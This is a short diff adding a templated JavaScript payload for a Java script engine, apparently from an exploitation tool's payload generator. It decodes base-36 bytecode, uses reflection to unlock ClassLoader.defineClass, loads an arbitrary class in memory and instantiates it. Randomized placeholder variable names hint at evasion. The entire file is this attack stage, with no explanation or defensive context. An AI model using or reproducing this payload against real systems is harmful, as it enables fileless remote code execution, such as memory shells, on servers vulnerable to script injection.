@@ -1,0 +1,10 @@
+var {{VAR:className}} = "{{className}}";
+var {{VAR:bigIntegerStr}} = "{{bigIntegerStr}}";
+var {{VAR:bytecode}} = new java.math.BigInteger({{VAR:bigIntegerStr}}, 36).toByteArray();
+var {{VAR:clsString}} = java.lang.Class.forName("java.lang.String");
+var {{VAR:clsByteArray}} = (new java.lang.String("a").getBytes().getClass());
+var {{VAR:clsInt}} = java.lang.Integer.TYPE;
+var {{VAR:defineClass}} = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", [{{VAR:clsString}}, {{VAR:clsByteArray}}, {{VAR:clsInt}}, {{VAR:clsInt}}]);
+{{VAR:defineClass}}.setAccessible(true);
+var {{VAR:clazz}} = {{VAR:defineClass}}.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0),java.lang.Thread.currentThread().getContextClassLoader()), {{VAR:className}}, {{VAR:bytecode}}, new java.lang.Integer(0), new java.lang.Integer({{VAR:bytecode}}.length));
+{{VAR:clazz}}.newInstance();
